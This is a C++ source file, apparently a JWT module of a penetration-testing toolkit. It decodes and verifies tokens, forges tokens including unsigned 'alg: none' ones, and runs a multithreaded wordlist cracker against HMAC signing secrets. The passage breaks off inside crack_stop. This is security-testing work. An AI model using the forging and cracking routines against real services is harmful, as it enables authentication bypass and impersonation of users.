#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>

#ifdef small
#undef small
#endif

#include "jwt_lab.hpp"

#include "payload_library.hpp"
#include "../../infra/executor.hpp"
#include "../../../helpers/diag_log.hpp"

#include <algorithm>
#include <atomic>
#include <cctype>
#include <chrono>
#include <cstring>
#include <map>
#include <memory>
#include <mutex>
#include <sstream>
#include <unordered_map>

#include <openssl/bio.h>
#include <openssl/evp.h>
#include <openssl/pem.h>
#include <openssl/params.h>
#include <openssl/core_names.h>
#include <utility>

namespace aida {
namespace burp {
namespace jwt_lab {

namespace {

struct crack_record_t
{
    uint64_t                                id = 0;
    std::atomic<size_t>                     attempts{0};
    std::atomic<bool>                       running{false};
    std::atomic<bool>                       stop_requested{false};
    std::vector<std::string>                words;
    std::string                             header_b64;
    std::string                             payload_b64;
    std::string                             signature_b64;
    std::string                             alg;
    std::mutex                              found_mtx;
    std::string                             secret_found;
    size_t                                  concurrency = 8;
    size_t                                  max_attempts = 1000000;
    std::atomic<size_t>                     next_index{0};
    std::atomic<int>                        active_workers{0};
};

struct state_t
{
    std::atomic<bool>                                       initialized{false};
    std::mutex                                              err_mtx;
    std::string                                             last_err;
    std::mutex                                              cracks_mtx;
    std::unordered_map<uint64_t, std::shared_ptr<crack_record_t>> cracks;
    std::atomic<uint64_t>                                   next_crack_id{1};
};

state_t& s()
{
    static state_t st;
    return st;
}

void set_err(const std::string& msg)
{
    auto& st = s();
    std::lock_guard<std::mutex> lk(st.err_mtx);
    st.last_err = msg;
}

const char kB64UrlChars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";

int b64url_index(char c)
{
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return 26 + (c - 'a');
    if (c >= '0' && c <= '9') return 52 + (c - '0');
    if (c == '-') return 62;
    if (c == '_') return 63;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

bool split_jwt_parts(const std::string& token, std::string& h, std::string& p, std::string& s_part)
{
    diag::log_tagged_fmt("jwt_lab", "split_jwt_parts token_len=%zu", token.size());
    h.clear(); p.clear(); s_part.clear();
    size_t first = token.find('.');
    if (first == std::string::npos) {
        diag::log_tagged_fmt("jwt_lab", "split_jwt_parts no_first_dot token_len=%zu", token.size());
        return false;
    }
    size_t second = token.find('.', first + 1);
    h = token.substr(0, first);
    if (second == std::string::npos) {
        diag::log_tagged_fmt("jwt_lab", "split_jwt_parts two_part_token header_len=%zu payload_len=%zu", h.size(), token.size() - first - 1);
        p = token.substr(first + 1);
        return !p.empty();
    }
    p = token.substr(first + 1, second - first - 1);
    s_part = token.substr(second + 1);
    diag::log_tagged_fmt("jwt_lab", "split_jwt_parts ok header_len=%zu payload_len=%zu sig_len=%zu", h.size(), p.size(), s_part.size());
    return true;
}

std::string sha_name_for_alg(const std::string& alg)
{
    if (alg == "HS256" || alg == "RS256" || alg == "ES256" || alg == "PS256") return "SHA256";
    if (alg == "HS384" || alg == "RS384" || alg == "ES384" || alg == "PS384") return "SHA384";
    if (alg == "HS512" || alg == "RS512" || alg == "ES512" || alg == "PS512") return "SHA512";
    return "SHA256";
}

const EVP_MD* md_for_sha(const std::string& sha_name)
{
    if (sha_name == "SHA384") return EVP_sha384();
    if (sha_name == "SHA512") return EVP_sha512();
    return EVP_sha256();
}

bool hmac_compute(const std::string& sha_name,
                  const uint8_t* key, size_t key_len,
                  const uint8_t* data, size_t data_len,
                  std::vector<uint8_t>& out)
{
    EVP_MAC* mac = EVP_MAC_fetch(nullptr, "HMAC", nullptr);
    if (!mac) return false;
    EVP_MAC_CTX* ctx = EVP_MAC_CTX_new(mac);
    EVP_MAC_free(mac);
    if (!ctx) return false;
    std::string digest = sha_name;
    char digest_buf[16];
    std::snprintf(digest_buf, sizeof(digest_buf), "%s", digest.c_str());
    OSSL_PARAM params[2];
    params[0] = OSSL_PARAM_construct_utf8_string(OSSL_MAC_PARAM_DIGEST, digest_buf, 0);
    params[1] = OSSL_PARAM_construct_end();
    const uint8_t kEmpty = 0;
    const uint8_t* eff_key = (key_len == 0) ? &kEmpty : key;
    if (EVP_MAC_init(ctx, eff_key, key_len, params) <= 0) { EVP_MAC_CTX_free(ctx); return false; }
    if (EVP_MAC_update(ctx, data, data_len) <= 0) { EVP_MAC_CTX_free(ctx); return false; }
    out.assign(EVP_MAX_MD_SIZE, 0);
    size_t outlen = out.size();
    if (EVP_MAC_final(ctx, out.data(), &outlen, out.size()) <= 0) { EVP_MAC_CTX_free(ctx); return false; }
    out.resize(outlen);
    EVP_MAC_CTX_free(ctx);
    return true;
}

EVP_PKEY* load_pem_private(const std::string& pem)
{
    BIO* bio = BIO_new_mem_buf(pem.data(), static_cast<int>(pem.size()));
    if (!bio) return nullptr;
    EVP_PKEY* pkey = PEM_read_bio_PrivateKey(bio, nullptr, nullptr, nullptr);
    BIO_free(bio);
    return pkey;
}

EVP_PKEY* load_pem_public(const std::string& pem)
{
    BIO* bio = BIO_new_mem_buf(pem.data(), static_cast<int>(pem.size()));
    if (!bio) return nullptr;
    EVP_PKEY* pkey = PEM_read_bio_PUBKEY(bio, nullptr, nullptr, nullptr);
    if (!pkey) {
        BIO_free(bio);
        bio = BIO_new_mem_buf(pem.data(), static_cast<int>(pem.size()));
        if (!bio) return nullptr;
        pkey = PEM_read_bio_PUBKEY(bio, nullptr, nullptr, nullptr);
    }
    BIO_free(bio);
    return pkey;
}

bool sign_rsa(EVP_PKEY* pkey, const EVP_MD* md, const uint8_t* data, size_t data_len, std::vector<uint8_t>& out)
{
    EVP_MD_CTX* ctx = EVP_MD_CTX_new();
    if (!ctx) return false;
    bool ok = false;
    if (EVP_DigestSignInit(ctx, nullptr, md, nullptr, pkey) == 1) {
        size_t needed = 0;
        if (EVP_DigestSign(ctx, nullptr, &needed, data, data_len) == 1) {
            out.assign(needed, 0);
            if (EVP_DigestSign(ctx, out.data(), &needed, data, data_len) == 1) {
                out.resize(needed);
                ok = true;
            }
        }
    }
    EVP_MD_CTX_free(ctx);
    return ok;
}

bool verify_rsa_internal(EVP_PKEY* pkey, const EVP_MD* md,
                         const uint8_t* data, size_t data_len,
                         const uint8_t* sig, size_t sig_len)
{
    EVP_MD_CTX* ctx = EVP_MD_CTX_new();
    if (!ctx) return false;
    bool ok = false;
    if (EVP_DigestVerifyInit(ctx, nullptr, md, nullptr, pkey) == 1) {
        const int rc = EVP_DigestVerify(ctx, sig, sig_len, data, data_len);
        ok = (rc == 1);
    }
    EVP_MD_CTX_free(ctx);
    return ok;
}

bool ecdsa_der_to_raw(const std::vector<uint8_t>& der, size_t component_len, std::vector<uint8_t>& out)
{
    if (der.size() < 8) return false;
    if (der[0] != 0x30) return false;
    size_t cursor = 1;
    size_t seq_len = 0;
    if (der[cursor] & 0x80) {
        const size_t nbytes = der[cursor] & 0x7F;
        if (nbytes == 0 || nbytes > 4 || cursor + 1 + nbytes > der.size()) return false;
        ++cursor;
        for (size_t i = 0; i < nbytes; ++i) seq_len = (seq_len << 8) | der[cursor++];
    } else {
        seq_len = der[cursor++];
    }
    (void)seq_len;
    auto read_int = [&](std::vector<uint8_t>& dst) -> bool {
        if (cursor + 2 > der.size()) return false;
        if (der[cursor++] != 0x02) return false;
        size_t ilen = 0;
        if (der[cursor] & 0x80) {
            const size_t nbytes = der[cursor] & 0x7F;
            if (nbytes == 0 || nbytes > 4 || cursor + 1 + nbytes > der.size()) return false;
            ++cursor;
            for (size_t i = 0; i < nbytes; ++i) ilen = (ilen << 8) | der[cursor++];
        } else {
            ilen = der[cursor++];
        }
        if (cursor + ilen > der.size()) return false;
        size_t start = cursor;
        while (ilen > 0 && der[start] == 0x00) { ++start; --ilen; }
        if (ilen > component_len) return false;
        dst.assign(component_len, 0);
        std::memcpy(dst.data() + component_len - ilen, der.data() + start, ilen);
        cursor = start + ilen;
        return true;
    };
    std::vector<uint8_t> r_part, s_part;
    if (!read_int(r_part) || !read_int(s_part)) return false;
    out.clear();
    out.reserve(component_len * 2);
    out.insert(out.end(), r_part.begin(), r_part.end());
    out.insert(out.end(), s_part.begin(), s_part.end());
    return true;
}

bool ecdsa_raw_to_der(const std::vector<uint8_t>& raw, std::vector<uint8_t>& der)
{
    if (raw.size() == 0 || (raw.size() & 1) != 0) return false;
    const size_t component_len = raw.size() / 2;
    auto build_int = [&](const uint8_t* bytes, std::vector<uint8_t>& dst) {
        size_t off = 0;
        while (off < component_len - 1 && bytes[off] == 0x00) ++off;
        std::vector<uint8_t> digits(bytes + off, bytes + component_len);
        if (!digits.empty() && (digits[0] & 0x80)) digits.insert(digits.begin(), 0x00);
        dst.push_back(0x02);
        if (digits.size() <= 0x7F) {
            dst.push_back(static_cast<uint8_t>(digits.size()));
        } else if (digits.size() <= 0xFF) {
            dst.push_back(0x81);
            dst.push_back(static_cast<uint8_t>(digits.size()));
        } else {
            dst.push_back(0x82);
            dst.push_back(static_cast<uint8_t>((digits.size() >> 8) & 0xFF));
            dst.push_back(static_cast<uint8_t>(digits.size() & 0xFF));
        }
        dst.insert(dst.end(), digits.begin(), digits.end());
    };
    std::vector<uint8_t> body;
    build_int(raw.data(), body);
    build_int(raw.data() + component_len, body);
    der.clear();
    der.push_back(0x30);
    if (body.size() <= 0x7F) {
        der.push_back(static_cast<uint8_t>(body.size()));
    } else if (body.size() <= 0xFF) {
        der.push_back(0x81);
        der.push_back(static_cast<uint8_t>(body.size()));
    } else {
        der.push_back(0x82);
        der.push_back(static_cast<uint8_t>((body.size() >> 8) & 0xFF));
        der.push_back(static_cast<uint8_t>(body.size() & 0xFF));
    }
    der.insert(der.end(), body.begin(), body.end());
    return true;
}

size_t ecdsa_component_len_for_alg(const std::string& alg)
{
    if (alg == "ES256") return 32;
    if (alg == "ES384") return 48;
    if (alg == "ES512") return 66;
    return 32;
}

void run_crack_worker(std::shared_ptr<crack_record_t> rec)
{
    diag::log_tagged_fmt("jwt_lab", "run_crack_worker start id=%llu alg=%s words=%zu",
        static_cast<unsigned long long>(rec->id), rec->alg.c_str(), rec->words.size());
    rec->active_workers.fetch_add(1, std::memory_order_acq_rel);
    const std::string sha = sha_name_for_alg(rec->alg);
    std::string signing_input;
    signing_input.reserve(rec->header_b64.size() + 1 + rec->payload_b64.size());
    signing_input.append(rec->header_b64);
    signing_input.push_back('.');
    signing_input.append(rec->payload_b64);
    std::vector<uint8_t> sig_bytes;
    if (!base64url_decode(rec->signature_b64, sig_bytes)) {
        diag::log_tagged_fmt("jwt_lab", "run_crack_worker sig_decode_failed id=%llu", static_cast<unsigned long long>(rec->id));
        rec->active_workers.fetch_sub(1, std::memory_order_acq_rel);
        rec->running.store(false, std::memory_order_release);
        return;
    }
    diag::log_tagged_fmt("jwt_lab", "run_crack_worker sig_decoded id=%llu sig_bytes=%zu sha=%s",
        static_cast<unsigned long long>(rec->id), sig_bytes.size(), sha.c_str());
    while (!rec->stop_requested.load(std::memory_order_acquire)) {
        const size_t idx = rec->next_index.fetch_add(1, std::memory_order_acq_rel);
        if (idx >= rec->words.size()) {
            diag::log_tagged_fmt("jwt_lab", "run_crack_worker wordlist_exhausted id=%llu idx=%zu", static_cast<unsigned long long>(rec->id), idx);
            break;
        }
        if (rec->attempts.load(std::memory_order_acquire) >= rec->max_attempts) {
            diag::log_tagged_fmt("jwt_lab", "run_crack_worker max_attempts_reached id=%llu", static_cast<unsigned long long>(rec->id));
            break;
        }
        const std::string& word = rec->words[idx];
        rec->attempts.fetch_add(1, std::memory_order_acq_rel);
        std::vector<uint8_t> mac;
        if (!hmac_compute(sha, reinterpret_cast<const uint8_t*>(word.data()), word.size(),
                          reinterpret_cast<const uint8_t*>(signing_input.data()), signing_input.size(), mac)) {
            continue;
        }
        if (mac.size() == sig_bytes.size()) {
            uint8_t diff = 0;
            for (size_t i = 0; i < mac.size(); ++i) diff |= static_cast<uint8_t>(mac[i] ^ sig_bytes[i]);
            if (diff == 0) {
                diag::log_tagged_fmt("jwt_lab", "run_crack_worker secret_found id=%llu secret_len=%zu idx=%zu",
                    static_cast<unsigned long long>(rec->id), word.size(), idx);
                std::lock_guard<std::mutex> lk(rec->found_mtx);
                if (rec->secret_found.empty()) {
                    rec->secret_found = word;
                    rec->stop_requested.store(true, std::memory_order_release);
                }
                break;
            }
        }
    }
    const int remaining = rec->active_workers.fetch_sub(1, std::memory_order_acq_rel);
    if (remaining == 1) {
        diag::log_tagged_fmt("jwt_lab", "run_crack_worker last_worker_done id=%llu attempts=%zu",
            static_cast<unsigned long long>(rec->id), rec->attempts.load(std::memory_order_acquire));
        rec->running.store(false, std::memory_order_release);
    }
}

}

std::string base64url_encode(const uint8_t* data, size_t len)
{
    std::string out;
    out.reserve(((len + 2) / 3) * 4);
    size_t i = 0;
    while (i + 3 <= len) {
        const uint32_t triplet = (uint32_t(data[i]) << 16) | (uint32_t(data[i + 1]) << 8) | uint32_t(data[i + 2]);
        out.push_back(kB64UrlChars[(triplet >> 18) & 0x3F]);
        out.push_back(kB64UrlChars[(triplet >> 12) & 0x3F]);
        out.push_back(kB64UrlChars[(triplet >> 6) & 0x3F]);
        out.push_back(kB64UrlChars[triplet & 0x3F]);
        i += 3;
    }
    const size_t rem = len - i;
    if (rem == 1) {
        const uint32_t triplet = uint32_t(data[i]) << 16;
        out.push_back(kB64UrlChars[(triplet >> 18) & 0x3F]);
        out.push_back(kB64UrlChars[(triplet >> 12) & 0x3F]);
    } else if (rem == 2) {
        const uint32_t triplet = (uint32_t(data[i]) << 16) | (uint32_t(data[i + 1]) << 8);
        out.push_back(kB64UrlChars[(triplet >> 18) & 0x3F]);
        out.push_back(kB64UrlChars[(triplet >> 12) & 0x3F]);
        out.push_back(kB64UrlChars[(triplet >> 6) & 0x3F]);
    }
    return out;
}

std::string base64url_encode(const std::string& data)
{
    return base64url_encode(reinterpret_cast<const uint8_t*>(data.data()), data.size());
}

bool base64url_decode(const std::string& in, std::vector<uint8_t>& out)
{
    out.clear();
    out.reserve((in.size() * 3) / 4 + 4);
    uint32_t buffer = 0;
    int bits = 0;
    for (char c : in) {
        if (c == '=') break;
        if (c == ' ' || c == '\r' || c == '\n' || c == '\t') continue;
        const int v = b64url_index(c);
        if (v < 0) return false;
        buffer = (buffer << 6) | static_cast<uint32_t>(v);
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            out.push_back(static_cast<uint8_t>((buffer >> bits) & 0xFF));
        }
    }
    return true;
}

bool initialize()
{
    auto& st = s();
    bool expected = false;
    if (!st.initialized.compare_exchange_strong(expected, true)) return true;
    diag::log_tagged("burp", "jwt_lab_initialized");
    return true;
}

void shutdown()
{
    diag::log_tagged_fmt("jwt_lab", "shutdown entry");
    auto& st = s();
    if (!st.initialized.exchange(false)) {
        diag::log_tagged_fmt("jwt_lab", "shutdown already_stopped");
        return;
    }
    std::vector<std::shared_ptr<crack_record_t>> records;
    {
        std::lock_guard<std::mutex> lk(st.cracks_mtx);
        records.reserve(st.cracks.size());
        for (auto& kv : st.cracks) records.push_back(kv.second);
        st.cracks.clear();
    }
    diag::log_tagged_fmt("jwt_lab", "shutdown stopping_cracks count=%zu", records.size());
    for (auto& r : records) {
        if (r) r->stop_requested.store(true, std::memory_order_release);
    }
    diag::log_tagged_fmt("jwt_lab", "shutdown complete");
}

jwt_parsed_t decode(const std::string& token)
{
    diag::log_tagged_fmt("jwt_lab", "decode entry token_len=%zu", token.size());
    jwt_parsed_t out;
    out.raw = token;
    if (token.empty()) {
        diag::log_tagged_fmt("jwt_lab", "decode error empty_token");
        set_err("decode: empty token");
        return out;
    }
    if (!split_jwt_parts(token, out.header_b64, out.payload_b64, out.signature_b64)) {
        diag::log_tagged_fmt("jwt_lab", "decode error invalid_structure");
        set_err("decode: invalid jwt structure");
        return out;
    }
    diag::log_tagged_fmt("jwt_lab", "decode split_ok header_b64_len=%zu payload_b64_len=%zu sig_b64_len=%zu",
        out.header_b64.size(), out.payload_b64.size(), out.signature_b64.size());
    std::vector<uint8_t> h_bytes;
    std::vector<uint8_t> p_bytes;
    if (!base64url_decode(out.header_b64, h_bytes)) {
        diag::log_tagged_fmt("jwt_lab", "decode error header_b64url_invalid");
        set_err("decode: header b64url invalid");
        return out;
    }
    if (!base64url_decode(out.payload_b64, p_bytes)) {
        diag::log_tagged_fmt("jwt_lab", "decode error payload_b64url_invalid");
        set_err("decode: payload b64url invalid");
        return out;
    }
    diag::log_tagged_fmt("jwt_lab", "decode b64_decoded header_bytes=%zu payload_bytes=%zu", h_bytes.size(), p_bytes.size());
    try {
        out.header = nlohmann::json::parse(std::string(h_bytes.begin(), h_bytes.end()), nullptr, false);
        out.payload = nlohmann::json::parse(std::string(p_bytes.begin(), p_bytes.end()), nullptr, false);
    } catch (...) {
        diag::log_tagged_fmt("jwt_lab", "decode error json_parse_threw");
        set_err("decode: json parse threw");
        return out;
    }
    if (out.header.is_object()) {
        if (out.header.contains("alg") && out.header["alg"].is_string()) out.alg = out.header["alg"].get<std::string>();
        if (out.header.contains("kid") && out.header["kid"].is_string()) out.kid = out.header["kid"].get<std::string>();
    }
    out.valid_structure = !out.header.is_discarded() && !out.payload.is_discarded()
                       && out.header.is_object() && out.payload.is_object();
    diag::log_tagged_fmt("jwt_lab", "decode done valid=%d alg=%s kid_len=%zu",
        (int)out.valid_structure, out.alg.c_str(), out.kid.size());
    return out;
}

std::string forge(const jwt_forge_input_t& in)
{
    diag::log_tagged_fmt("jwt_lab", "forge entry alg=%s", in.alg.c_str());
    nlohmann::json hdr = in.header.is_object() ? in.header : nlohmann::json::object();
    hdr["alg"] = in.alg;
    if (!hdr.contains("typ")) hdr["typ"] = "JWT";

    const std::string hdr_text = hdr.dump();
    const std::string payload_text = in.payload.is_object() ? in.payload.dump() : std::string("{}");

    const std::string h_b64 = base64url_encode(hdr_text);
    const std::string p_b64 = base64url_encode(payload_text);
    std::string signing_input;
    signing_input.reserve(h_b64.size() + 1 + p_b64.size());
    signing_input.append(h_b64);
    signing_input.push_back('.');
    signing_input.append(p_b64);

    std::string sig_b64;
    const std::string& alg = in.alg;

    if (alg == "none") {
        diag::log_tagged_fmt("jwt_lab", "forge alg_none no_signature");
        sig_b64.clear();
    } else if (alg == "HS256" || alg == "HS384" || alg == "HS512") {
        diag::log_tagged_fmt("jwt_lab", "forge alg_hmac alg=%s secret_len=%zu signing_input_len=%zu",
            alg.c_str(), in.hmac_secret.size(), signing_input.size());
        std::vector<uint8_t> mac;
        if (!hmac_compute(sha_name_for_alg(alg),
                          reinterpret_cast<const uint8_t*>(in.hmac_secret.data()), in.hmac_secret.size(),
                          reinterpret_cast<const uint8_t*>(signing_input.data()), signing_input.size(), mac)) {
            diag::log_tagged_fmt("jwt_lab", "forge error hmac_compute_failed alg=%s", alg.c_str());
            set_err("forge: hmac compute failed");
            return std::string();
        }
        sig_b64 = base64url_encode(mac.data(), mac.size());
        diag::log_tagged_fmt("jwt_lab", "forge hmac_ok mac_bytes=%zu sig_b64_len=%zu", mac.size(), sig_b64.size());
    } else if (alg == "RS256" || alg == "RS384" || alg == "RS512") {
        diag::log_tagged_fmt("jwt_lab", "forge alg_rsa alg=%s pem_len=%zu", alg.c_str(), in.rsa_private_pem.size());
        EVP_PKEY* pkey = load_pem_private(in.rsa_private_pem);
        if (!pkey) {
            diag::log_tagged_fmt("jwt_lab", "forge error rsa_key_parse_failed");
            set_err("forge: rsa private key parse failed");
            return std::string();
        }
        std::vector<uint8_t> sig;
        const bool ok = sign_rsa(pkey, md_for_sha(sha_name_for_alg(alg)),
                                 reinterpret_cast<const uint8_t*>(signing_input.data()), signing_input.size(), sig);
        EVP_PKEY_free(pkey);
        if (!ok) {
            diag::log_tagged_fmt("jwt_lab", "forge error rsa_sign_failed alg=%s", alg.c_str());
            set_err("forge: rsa sign failed");
            return std::string();
        }
        sig_b64 = base64url_encode(sig.data(), sig.size());
        diag::log_tagged_fmt("jwt_lab", "forge rsa_ok sig_bytes=%zu", sig.size());
    } else if (alg == "ES256" || alg == "ES384" || alg == "ES512") {
        diag::log_tagged_fmt("jwt_lab", "forge alg_ecdsa alg=%s pem_len=%zu", alg.c_str(), in.ecdsa_private_pem.size());
        EVP_PKEY* pkey = load_pem_private(in.ecdsa_private_pem);
        if (!pkey) {
            diag::log_tagged_fmt("jwt_lab", "forge error ecdsa_key_parse_failed");
            set_err("forge: ecdsa private key parse failed");
            return std::string();
        }
        std::vector<uint8_t> der_sig;
        const bool ok = sign_rsa(pkey, md_for_sha(sha_name_for_alg(alg)),
                                 reinterpret_cast<const uint8_t*>(signing_input.data()), signing_input.size(), der_sig);
        EVP_PKEY_free(pkey);
        if (!ok) {
            diag::log_tagged_fmt("jwt_lab", "forge error ecdsa_sign_failed alg=%s", alg.c_str());
            set_err("forge: ecdsa sign failed");
            return std::string();
        }
        std::vector<uint8_t> raw_sig;
        if (!ecdsa_der_to_raw(der_sig, ecdsa_component_len_for_alg(alg), raw_sig)) {
            diag::log_tagged_fmt("jwt_lab", "forge error ecdsa_der_to_raw_failed der_len=%zu", der_sig.size());
            set_err("forge: ecdsa der-to-raw failed");
            return std::string();
        }
        sig_b64 = base64url_encode(raw_sig.data(), raw_sig.size());
        diag::log_tagged_fmt("jwt_lab", "forge ecdsa_ok raw_sig_bytes=%zu", raw_sig.size());
    } else {
        diag::log_tagged_fmt("jwt_lab", "forge error unsupported_alg alg=%s", alg.c_str());
        set_err("forge: unsupported alg");
        return std::string();
    }

    std::string out = signing_input;
    out.push_back('.');
    out.append(sig_b64);
    diag::log_tagged_fmt("jwt_lab", "forge success alg=%s token_len=%zu", alg.c_str(), out.size());
    return out;
}

bool verify_hmac(const std::string& token, const std::string& secret)
{
    diag::log_tagged_fmt("jwt_lab", "verify_hmac entry token_len=%zu secret_len=%zu", token.size(), secret.size());
    jwt_parsed_t parsed = decode(token);
    if (!parsed.valid_structure) {
        diag::log_tagged_fmt("jwt_lab", "verify_hmac error invalid_structure");
        return false;
    }
    if (parsed.alg != "HS256" && parsed.alg != "HS384" && parsed.alg != "HS512") {
        diag::log_tagged_fmt("jwt_lab", "verify_hmac error wrong_alg alg=%s", parsed.alg.c_str());
        return false;
    }
    diag::log_tagged_fmt("jwt_lab", "verify_hmac alg=%s computing_mac", parsed.alg.c_str());
    std::string signing_input = parsed.header_b64;
    signing_input.push_back('.');
    signing_input.append(parsed.payload_b64);
    std::vector<uint8_t> mac;
    if (!hmac_compute(sha_name_for_alg(parsed.alg),
                      reinterpret_cast<const uint8_t*>(secret.data()), secret.size(),
                      reinterpret_cast<const uint8_t*>(signing_input.data()), signing_input.size(), mac)) {
        diag::log_tagged_fmt("jwt_lab", "verify_hmac error hmac_compute_failed");
        return false;
    }
    std::vector<uint8_t> sig_bytes;
    if (!base64url_decode(parsed.signature_b64, sig_bytes)) {
        diag::log_tagged_fmt("jwt_lab", "verify_hmac error sig_decode_failed");
        return false;
    }
    if (mac.size() != sig_bytes.size()) {
        diag::log_tagged_fmt("jwt_lab", "verify_hmac error mac_size_mismatch mac=%zu sig=%zu", mac.size(), sig_bytes.size());
        return false;
    }
    uint8_t diff = 0;
    for (size_t i = 0; i < mac.size(); ++i) diff |= static_cast<uint8_t>(mac[i] ^ sig_bytes[i]);
    diag::log_tagged_fmt("jwt_lab", "verify_hmac result=%s alg=%s", diff == 0 ? "valid" : "invalid", parsed.alg.c_str());
    return diff == 0;
}

bool verify_rsa(const std::string& token, const std::string& public_pem)
{
    diag::log_tagged_fmt("jwt_lab", "verify_rsa entry token_len=%zu pem_len=%zu", token.size(), public_pem.size());
    jwt_parsed_t parsed = decode(token);
    if (!parsed.valid_structure) {
        diag::log_tagged_fmt("jwt_lab", "verify_rsa error invalid_structure");
        return false;
    }
    if (parsed.alg != "RS256" && parsed.alg != "RS384" && parsed.alg != "RS512") {
        diag::log_tagged_fmt("jwt_lab", "verify_rsa error wrong_alg alg=%s", parsed.alg.c_str());
        return false;
    }
    EVP_PKEY* pkey = load_pem_public(public_pem);
    if (!pkey) {
        diag::log_tagged_fmt("jwt_lab", "verify_rsa error public_key_parse_failed");
        return false;
    }
    std::string signing_input = parsed.header_b64;
    signing_input.push_back('.');
    signing_input.append(parsed.payload_b64);
    std::vector<uint8_t> sig_bytes;
    if (!base64url_decode(parsed.signature_b64, sig_bytes)) {
        diag::log_tagged_fmt("jwt_lab", "verify_rsa error sig_decode_failed");
        EVP_PKEY_free(pkey);
        return false;
    }
    const bool ok = verify_rsa_internal(pkey, md_for_sha(sha_name_for_alg(parsed.alg)),
                                        reinterpret_cast<const uint8_t*>(signing_input.data()), signing_input.size(),
                                        sig_bytes.data(), sig_bytes.size());
    EVP_PKEY_free(pkey);
    diag::log_tagged_fmt("jwt_lab", "verify_rsa result=%s alg=%s", ok ? "valid" : "invalid", parsed.alg.c_str());
    return ok;
}

bool verify_ecdsa(const std::string& token, const std::string& public_pem)
{
    diag::log_tagged_fmt("jwt_lab", "verify_ecdsa entry token_len=%zu pem_len=%zu", token.size(), public_pem.size());
    jwt_parsed_t parsed = decode(token);
    if (!parsed.valid_structure) {
        diag::log_tagged_fmt("jwt_lab", "verify_ecdsa error invalid_structure");
        return false;
    }
    if (parsed.alg != "ES256" && parsed.alg != "ES384" && parsed.alg != "ES512") {
        diag::log_tagged_fmt("jwt_lab", "verify_ecdsa error wrong_alg alg=%s", parsed.alg.c_str());
        return false;
    }
    EVP_PKEY* pkey = load_pem_public(public_pem);
    if (!pkey) {
        diag::log_tagged_fmt("jwt_lab", "verify_ecdsa error public_key_parse_failed");
        return false;
    }
    std::string signing_input = parsed.header_b64;
    signing_input.push_back('.');
    signing_input.append(parsed.payload_b64);
    std::vector<uint8_t> raw_sig;
    if (!base64url_decode(parsed.signature_b64, raw_sig)) {
        diag::log_tagged_fmt("jwt_lab", "verify_ecdsa error sig_decode_failed");
        EVP_PKEY_free(pkey);
        return false;
    }
    std::vector<uint8_t> der_sig;
    if (!ecdsa_raw_to_der(raw_sig, der_sig)) {
        diag::log_tagged_fmt("jwt_lab", "verify_ecdsa error raw_to_der_failed raw_len=%zu", raw_sig.size());
        EVP_PKEY_free(pkey);
        return false;
    }
    const bool ok = verify_rsa_internal(pkey, md_for_sha(sha_name_for_alg(parsed.alg)),
                                        reinterpret_cast<const uint8_t*>(signing_input.data()), signing_input.size(),
                                        der_sig.data(), der_sig.size());
    EVP_PKEY_free(pkey);
    diag::log_tagged_fmt("jwt_lab", "verify_ecdsa result=%s alg=%s", ok ? "valid" : "invalid", parsed.alg.c_str());
    return ok;
}

uint64_t start_crack(const crack_config_t& cfg)
{
    auto& st = s();
    jwt_parsed_t parsed = decode(cfg.token);
    if (!parsed.valid_structure) { set_err("crack: invalid token"); return 0; }
    if (parsed.alg != "HS256" && parsed.alg != "HS384" && parsed.alg != "HS512") {
        set_err("crack: only HS256/HS384/HS512 are supported");
        return 0;
    }
    auto rec = std::make_shared<crack_record_t>();
    rec->id = st.next_crack_id.fetch_add(1, std::memory_order_acq_rel);
    rec->header_b64 = parsed.header_b64;
    rec->payload_b64 = parsed.payload_b64;
    rec->signature_b64 = parsed.signature_b64;
    rec->alg = parsed.alg;
    rec->concurrency = cfg.concurrency == 0 ? 1 : cfg.concurrency;
    if (rec->concurrency > 32) rec->concurrency = 32;
    rec->max_attempts = cfg.max_attempts == 0 ? 1000000 : cfg.max_attempts;

    if (!cfg.custom_words.empty()) {
        rec->words = cfg.custom_words;
    } else if (!cfg.wordlist_id.empty()) {
        rec->words = aida::burp::payloads::entries(cfg.wordlist_id, rec->max_attempts);
    }
    if (rec->words.empty()) {
        set_err("crack: no words to try");
        return 0;
    }
    if (rec->words.size() > rec->max_attempts) rec->words.resize(rec->max_attempts);
    rec->running.store(true, std::memory_order_release);

    {
        std::lock_guard<std::mutex> lk(st.cracks_mtx);
        st.cracks[rec->id] = rec;
    }

    size_t posted_workers = 0;
    for (size_t i = 0; i < rec->concurrency; ++i) {
        std::shared_ptr<crack_record_t> rec_copy = rec;
        if ([&]() {
            ::aida::infra::executor::submission_t sub;
            sub.owner_subsystem = "burp.jwt_lab";
            sub.label = "jwt.crack_worker";
            sub.thread_class = "long_running";
            sub.domain = aida::infra::executor::domain_t::long_running;
            sub.priority = 3;
            sub.body = [rec_copy]() { run_crack_worker(rec_copy); };
            return ::aida::infra::executor::submit(std::move(sub)).submitted;
        }())
            ++posted_workers;
    }
    if (posted_workers == 0) {
        rec->running.store(false, std::memory_order_release);
        {
            std::lock_guard<std::mutex> lk(st.cracks_mtx);
            st.cracks.erase(rec->id);
        }
        set_err("jwt crack executor submission failed");
        return 0;
    }
    diag::log_tagged_fmt("burp", "jwt_crack_start id=%llu words=%zu concurrency=%zu",
        static_cast<unsigned long long>(rec->id), rec->words.size(), rec->concurrency);
    return rec->id;
}

crack_status_t crack_status(uint64_t id)
{
    diag::log_tagged_fmt("jwt_lab", "crack_status entry id=%llu", static_cast<unsigned long long>(id));
    auto& st = s();
    std::shared_ptr<crack_record_t> rec;
    {
        std::lock_guard<std::mutex> lk(st.cracks_mtx);
        auto it = st.cracks.find(id);
        if (it != st.cracks.end()) rec = it->second;
    }
    crack_status_t out;
    if (!rec) {
        diag::log_tagged_fmt("jwt_lab", "crack_status not_found id=%llu", static_cast<unsigned long long>(id));
        return out;
    }
    out.id = rec->id;
    out.attempts = rec->attempts.load(std::memory_order_acquire);
    out.running = rec->running.load(std::memory_order_acquire);
    {
        std::lock_guard<std::mutex> lk(rec->found_mtx);
        out.secret_found = rec->secret_found;
    }
    diag::log_tagged_fmt("jwt_lab", "crack_status id=%llu running=%d attempts=%zu secret_found=%d",
        static_cast<unsigned long long>(id), (int)out.running, out.attempts, !out.secret_found.empty());
    return out;
}

void crack_stop(uint64_t id)
{
